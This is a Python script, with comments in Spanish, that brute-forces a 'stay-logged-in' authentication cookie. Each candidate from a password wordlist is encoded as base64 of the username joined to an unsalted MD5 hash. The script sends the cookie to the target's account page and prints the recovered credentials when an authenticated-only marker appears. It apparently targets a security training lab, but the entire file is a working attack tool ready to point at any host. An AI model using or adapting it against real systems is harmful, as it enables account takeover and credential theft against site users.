#!/usr/bin/env python3
"""
Brute-force de la cookie 'stay-logged-in' que codifica credenciales.

Formato observado: stay-logged-in = base64(f"{username}:{md5(password)}")
El server al recibir la cookie decodifica, separa user:hash, y autentica si
matchea con el hash almacenado del usuario. MD5 sin salt y rapido = wordlist
de 100 candidatos se prueba en segundos.

Detector de exito: el boton 'Update email' aparece SOLO en estado autenticado.
Si el body de /my-account?id=<target> lo contiene, la cookie fue aceptada.

Uso:
    python3 cookie_brute.py <lab-host> <passwords-file> [--target carlos]
"""
import argparse
import base64
import hashlib
import sys
from urllib.parse import quote

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


SUCCESS_MARKER = "Update email"


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 cookie-brute"})
    retry = Retry(total=3, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def build_cookie(username, password):
    md5 = hashlib.md5(password.encode()).hexdigest()
    return base64.b64encode(f"{username}:{md5}".encode()).decode()


def attempt(session, host, target, cookie_value):
    cookies = {"stay-logged-in": cookie_value}
    r = session.get(f"https://{host}/my-account?id={quote(target)}",
                    cookies=cookies, timeout=30, allow_redirects=False)
    return r.status_code, r.text


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("passwords_file")
    p.add_argument("--target", default="carlos")
    args = p.parse_args()

    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = make_session()
    print(f"[*] target={args.target}  candidatos={len(passwords)}", file=sys.stderr)
    print(f"[*] formato: base64({args.target}:md5(pwd))", file=sys.stderr)

    for i, pwd in enumerate(passwords, start=1):
        cookie = build_cookie(args.target, pwd)
        try:
            status, text = attempt(session, args.host, args.target, cookie)
        except requests.RequestException as e:
            print(f"[!] error con {pwd!r}: {e}", file=sys.stderr)
            continue

        if SUCCESS_MARKER in text:
            print(f"\n[+] credenciales: {args.target}:{pwd}")
            print(f"[+] cookie: stay-logged-in={cookie}", file=sys.stderr)
            print(f"[+] status={status} len={len(text)}", file=sys.stderr)
            return 0

        if i % 20 == 0:
            print(f"[*] {i}/{len(passwords)} probados sin exito", file=sys.stderr)

    print("[!] wordlist agotada sin exito", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
